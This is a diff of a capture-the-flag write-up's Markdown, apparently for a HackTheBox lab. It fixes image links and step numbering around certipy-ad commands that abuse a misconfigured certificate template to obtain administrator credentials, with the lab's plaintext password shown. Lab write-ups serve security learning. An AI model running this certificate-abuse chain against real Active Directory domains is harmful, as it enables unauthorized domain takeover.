@@ -250,28 +250,31 @@ The SubCA certificate template is vulnerable to ESC1, but only administrators ca
 ```
 certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
 ```
-![[Pasted image 20250106200058.png]]
+![](/img/Pasted%20image%2020250106200058.png)
 
 Verify the template has been enabled
 
-![[/img/Pasted image 20250106195957.png]]
+![](/img/Pasted%20image%2020250106195957.png)
 ###### Step 3 Request a certificate on behalf of the administrator:
 ```
 certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
 ```
 ![](/img/Pasted%20image%2020250216003600.png)
+
 ###### Step 4 Re-issue our failed cert:
 ```
 certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 27
 ```
 ![](/img/Pasted%20image%2020250216004907.png)
+
 ###### Step 5 Retrieve the issued cert and download as `.pfx`:
 ```
 certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 27
 
 ```
 ![](/img/Pasted%20image%2020250216005318.png)
-###### Step 5 Retrieve the issued cert and download as `.pfx`:
+
+###### Step 6 Retrieve the issued cert and download as `.pfx`:
 ```
 certipy-ad auth -pfx administrator.pfx
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -300,6 +303,6 @@ We can now login as the admin using their hash obtained, through pass the hash:
 By chaining 🛠️ misconfigurations and outdated 📂, I successfully escalated privileges to *root**.
 
 ###### References & Suggested Reading:
-https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
-https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547
+https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf<br>
+https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547<br>
 https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac
